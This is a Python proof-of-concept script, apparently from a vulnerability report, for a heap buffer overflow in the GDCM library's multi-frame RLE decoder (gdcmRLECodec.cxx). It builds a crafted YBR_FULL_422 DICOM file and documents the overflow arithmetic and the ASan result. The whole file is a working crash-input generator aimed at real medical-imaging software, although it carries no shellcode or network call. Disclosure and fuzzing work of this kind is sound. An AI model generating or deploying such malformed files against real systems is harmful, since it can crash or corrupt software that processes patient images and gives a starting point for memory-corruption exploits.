#!/usr/bin/env python3
"""
PoC generator for Finding 1: RLE + YBR_FULL_422 multi-frame heap overflow.

Bug: Source/MediaStorageAndFileFormat/gdcmRLECodec.cxx:641 -- the memcpy in
DecodeFragment() copies os.str().size() bytes into buffer+pos, reached from
Decode() at line 686/694 (NumberOfDimensions == 3 path). Unlike the 2D path
(which asserts check == len at line 666), the multi-frame path has no size
guard before the copy, so a stream larger than the per-frame slot overruns
the buffer.

Per-frame post-processing in ImageCodec::DecodeByStreams() over-expands the
stream (see arithmetic below), so the copied size (36,864, per ASan) exceeds
the whole 24,576-byte allocation, and frame 0 (pos == 0) writes it starting
at offset 0.

Trigger: gdcm::ImageReader::Read() -- fires via ComputeLossyFlag(), no
explicit GetBuffer() call required.

Overflow math for this PoC (64x64, 3 SPP, 8 BA, 2 frames):
  GetBufferLength = 64*64*3*2 = 24,576 bytes (total buffer)
  RLE decode per frame                      = 12,288 bytes
  DoYBRFull422 expands x3/2                  = 18,432 bytes (written to pl_os)
  DoPlanarConfiguration(*cur_is, pl_os) reads pl_os and appends to the SAME
    stream                                  = 18,432 + 18,432 = 36,864 bytes
  memcpy copies 36,864 bytes to buffer+0 (frame 0) into the 24,576-byte alloc
  -> overflow = 36,864 - 24,576 = 12,288 bytes past the allocation
     (matches ASan: WRITE of size 36864, 0 bytes after a 24576-byte region)
"""

import struct
import os

ROWS = 64
COLS = 64
SPP = 3
FRAMES = 2
BA = 8
BS = 8
HB = 7

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c21_rle_ybr422.dcm")

RLE_TS_UID = b"1.2.840.10008.1.2.5"
SOP_CLASS_UID = b"1.2.840.10008.5.1.4.1.1.3.1"  # Ultrasound Multi-frame Image Storage
SOP_INSTANCE_UID = b"1.2.3.4.5.6.7.8.9"
IMPL_CLASS_UID = b"1.2.3.4.5.6.7.8"


def pad_uid(uid: bytes) -> bytes:
    if len(uid) % 2 != 0:
        return uid + b"\x00"
    return uid


def encode_tag(group: int, elem: int) -> bytes:
    return struct.pack("<HH", group, elem)


def encode_explicit_vr(group: int, elem: int, vr: bytes, value: bytes) -> bytes:
    tag = encode_tag(group, elem)
    length = len(value)
    # OB, OW, SQ, UC, UR, UT, UN use a 4-byte length preceded by 2 reserved bytes
    if vr in (b"OB", b"OW", b"SQ", b"UC", b"UR", b"UT", b"UN"):
        return tag + vr + b"\x00\x00" + struct.pack("<I", length) + value
    else:
        return tag + vr + struct.pack("<H", length) + value


def encode_ui(group: int, elem: int, uid: bytes) -> bytes:
    padded = pad_uid(uid)
    return encode_explicit_vr(group, elem, b"UI", padded)


def encode_us(group: int, elem: int, value: int) -> bytes:
    return encode_explicit_vr(group, elem, b"US", struct.pack("<H", value))


def encode_ul(group: int, elem: int, value: int) -> bytes:
    return encode_explicit_vr(group, elem, b"UL", struct.pack("<I", value))


def encode_ob(group: int, elem: int, value: bytes) -> bytes:
    return encode_explicit_vr(group, elem, b"OB", value)


def encode_cs(group: int, elem: int, value: bytes) -> bytes:
    if len(value) % 2 != 0:
        value = value + b" "
    return encode_explicit_vr(group, elem, b"CS", value)


def encode_is(group: int, elem: int, value: bytes) -> bytes:
    if len(value) % 2 != 0:
        value = value + b" "
    return encode_explicit_vr(group, elem, b"IS", value)


def rle_encode_literal(data: bytes) -> bytes:
    """RLE-encode as literal runs only (control byte 0..127 = run length - 1)."""
    result = bytearray()
    offset = 0
    while offset < len(data):
        chunk_size = min(128, len(data) - offset)
        result.append(chunk_size - 1)
        result.extend(data[offset:offset + chunk_size])
        offset += chunk_size
    return bytes(result)


def make_rle_fragment(rows: int, cols: int, spp: int = 3, fill_byte: int = 0x41) -> bytes:
    """
    One RLE fragment = 64-byte header (NumSegments + 15 offsets) followed by
    `spp` RLE segments, each decoding to rows*cols bytes. Total decoded size
    per frame is spp*rows*cols -- this is what DoYBRFull422 then expands 3/2.
    """
    segment_size = rows * cols
    segments = []
    for c in range(spp):
        seg_data = bytes([fill_byte + c] * segment_size)
        segments.append(rle_encode_literal(seg_data))

    header = bytearray(64)
    struct.pack_into('<I', header, 0, spp)  # NumSegments
    offset = 64
    for i in range(spp):
        struct.pack_into('<I', header, 4 + i * 4, offset)
        offset += len(segments[i])

    fragment = bytes(header)
    for seg in segments:
        fragment += seg
    return fragment


def make_encapsulated_pixel_data(fragments: list) -> bytes:
    """Encapsulated PixelData: empty Basic Offset Table, one item per fragment, delimiter."""
    result = bytearray()

    result += struct.pack("<HH", 0xFFFE, 0xE000)
    result += struct.pack("<I", 0)  # empty Basic Offset Table

    for frag in fragments:
        frag_data = frag
        if len(frag_data) % 2 != 0:
            frag_data = frag_data + b"\x00"
        result += struct.pack("<HH", 0xFFFE, 0xE000)
        result += struct.pack("<I", len(frag_data))
        result += frag_data

    result += struct.pack("<HH", 0xFFFE, 0xE0DD)
    result += struct.pack("<I", 0)

    return bytes(result)


def build_pixel_data_element(encapsulated: bytes) -> bytes:
    tag = encode_tag(0x7FE0, 0x0010)
    vr = b"OB"
    reserved = b"\x00\x00"
    undef_len = struct.pack("<I", 0xFFFFFFFF)
    return tag + vr + reserved + undef_len + encapsulated


def generate_poc():
    meta_version = encode_ob(0x0002, 0x0001, b"\x00\x01")
    meta_sop_class = encode_ui(0x0002, 0x0002, SOP_CLASS_UID)
    meta_sop_instance = encode_ui(0x0002, 0x0003, SOP_INSTANCE_UID)
    meta_ts = encode_ui(0x0002, 0x0010, RLE_TS_UID)
    meta_impl_class = encode_ui(0x0002, 0x0012, IMPL_CLASS_UID)

    meta_body = meta_version + meta_sop_class + meta_sop_instance + meta_ts + meta_impl_class
    meta_group_len = encode_ul(0x0002, 0x0000, len(meta_body))
    meta_header = meta_group_len + meta_body

    fragments = [
        make_rle_fragment(ROWS, COLS, SPP, fill_byte=0x41 + i * 3)
        for i in range(FRAMES)
    ]

    encapsulated = make_encapsulated_pixel_data(fragments)
    pixel_data = build_pixel_data_element(encapsulated)

    dataset = b""
    dataset += encode_ui(0x0008, 0x0016, SOP_CLASS_UID)
    dataset += encode_ui(0x0008, 0x0018, SOP_INSTANCE_UID)
    dataset += encode_us(0x0028, 0x0002, SPP)
    dataset += encode_cs(0x0028, 0x0004, b"YBR_FULL_422")
    dataset += encode_us(0x0028, 0x0006, 0)  # PlanarConfiguration
    dataset += encode_is(0x0028, 0x0008, str(FRAMES).encode())  # NumberOfFrames
    dataset += encode_us(0x0028, 0x0010, ROWS)
    dataset += encode_us(0x0028, 0x0011, COLS)
    dataset += encode_us(0x0028, 0x0100, BA)
    dataset += encode_us(0x0028, 0x0101, BS)
    dataset += encode_us(0x0028, 0x0102, HB)
    dataset += encode_us(0x0028, 0x0103, 0)  # PixelRepresentation
    dataset += pixel_data

    preamble = b"\x00" * 128 + b"DICM"
    dicom_file = preamble + meta_header + dataset

    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    with open(OUTPUT_FILE, "wb") as f:
        f.write(dicom_file)

    print(f"[+] Written: {OUTPUT_FILE} ({len(dicom_file)} bytes)")
    print(f"[*] Expected: ASan heap-buffer-overflow WRITE at gdcmRLECodec.cxx:641")


if __name__ == "__main__":
    generate_poc()
